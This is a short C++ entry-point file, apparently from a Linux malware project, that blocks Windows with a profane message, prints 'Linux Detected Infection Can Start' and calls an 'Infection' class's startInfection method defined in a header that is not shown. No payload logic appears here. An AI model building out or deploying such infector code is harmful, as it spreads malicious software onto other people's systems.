#include "Infection.h"

int main(){
#ifdef _WIN32
	printf("WHY THE FUCK ARE YOU RUNNING THIS ON WINDOWS !\n");
	exit(1);
#else
	system("clear");
	printf("[+] Linux Detected Infection Can Start !\n");
#endif
 	Infection infect;
	infect.startInfection();
	return 0;
}


